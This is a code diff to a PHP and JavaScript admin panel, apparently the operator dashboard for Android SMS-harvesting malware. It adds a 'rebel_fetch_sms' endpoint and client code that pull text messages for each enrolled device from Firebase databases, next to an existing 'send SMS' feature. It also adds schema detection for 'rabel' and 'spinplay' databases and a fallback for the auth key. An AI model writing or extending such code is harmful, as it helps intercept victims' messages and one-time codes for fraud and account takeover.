@@ -26,6 +26,23 @@ if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
   rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
 }
 
+if (isset($_GET['rebel_fetch_sms']) || isset($_POST['rebel_fetch_sms'])) {
+  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
+  if (!is_array($body)) {
+    $body = [];
+  }
+
+  $deviceId = trim((string)($body['device_id'] ?? ''));
+  $fbUrl = rtrim(trim((string)($body['database_url'] ?? '')), '/');
+  $fbKey = trim((string)($body['auth_key'] ?? ''));
+  $schema = strtolower(trim((string)($body['schema'] ?? 'rabel')));
+  $deviceNode = trim((string)($body['device_node'] ?? 'clients'));
+  $compositeId = trim((string)($body['composite_id'] ?? ''));
+
+  $result = rebel_fetch_sms_for_device($fbUrl, $fbKey, $deviceId, $schema, $deviceNode, $compositeId);
+  rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
+}
+
 function rebel_avatar_url() {
   if (is_file(__DIR__ . '/assets/rebel-avatar.jpg')) return 'assets/rebel-avatar.jpg';
   if (is_file(__DIR__ . '/rebel-avatar.jpg')) return 'rebel-avatar.jpg';
@@ -381,6 +398,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 <script src="firebase_defaults.js"></script>
 <script>
 var SEND_SMS_URL='admin.php?rebel_send_sms=1';
+var FETCH_SMS_URL='admin.php?rebel_fetch_sms=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var FIREBASE_API_URL='admin.php?rebel_firebase_api=1';
 var SERVER_FIREBASES=<?= json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE) ?>;
@@ -529,7 +547,9 @@ function reloadServerFirebase(){
 function getFbAuthKey(inst){
   if(!inst||!inst.config)return '';
   var c=inst.config;
-  return c.secret||c.authKey||c.key||c.databaseSecret||'';
+  var key=c.secret||c.authKey||c.key||c.databaseSecret||'';
+  if(!key&&c.databaseURL)key=(c.databaseURL||'').replace(/\/$/,'');
+  return key;
 }
 function restUrlForInst(inst,path){
   var url=inst.restUrl+'/'+path.replace(/^\//,'');
@@ -697,8 +717,10 @@ function discoverInstance(inst){
   return restJson(shallow).then(function(roots){
     if(!roots||typeof roots!=='object'||isFirebaseErr(roots))return;
     if(roots.messages)inst.schema='rabel';
-    else if(roots.devices&&!roots.clients)inst.schema='spinplay';
     else if(roots.clients)inst.schema='rabel';
+    else if(roots.devices||roots.devices_status)inst.schema='spinplay';
+    else if(inst.restUrl.indexOf('rabel')>=0)inst.schema='rabel';
+    if(inst.config)inst.config.schema=inst.schema;
     var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
     var tasks=[];
     nodes.forEach(function(n){
@@ -901,17 +923,20 @@ function mergeSmsLists(){
 
 function fetchSmsFromPaths(inst,d){
   if(!inst||!d)return Promise.resolve([]);
-  var paths=smsPathsForDevice(d);
-  return Promise.all(paths.map(function(p){
-    return restJsonInst(inst,p).then(function(data){
-      if(!data||isFirebaseErr(data))return [];
-      return smsAsList(data).map(normalizeSms).filter(Boolean);
-    }).catch(function(){return[];});
-  })).then(function(results){
-    var args=[mergeSmsLists];
-    results.forEach(function(r){args.push(r);});
-    return mergeSmsLists.apply(null,results);
-  });
+  var hdr={'Content-Type':'application/json'};
+  var apk=rebelApkHeaders();
+  for(var k in apk)hdr[k]=apk[k];
+  return fetch(FETCH_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify({
+    device_id:d.rawId,
+    composite_id:d.id,
+    database_url:inst.restUrl,
+    auth_key:getFbAuthKey(inst),
+    schema:inst.schema||'rabel',
+    device_node:d.deviceNode||'clients'
+  }),cache:'no-store'}).then(function(r){return r.json();}).then(function(res){
+    if(!res||!res.ok)return [];
+    return res.messages||[];
+  }).catch(function(){return[];});
 }
 
 function loadSmsForDevice(){
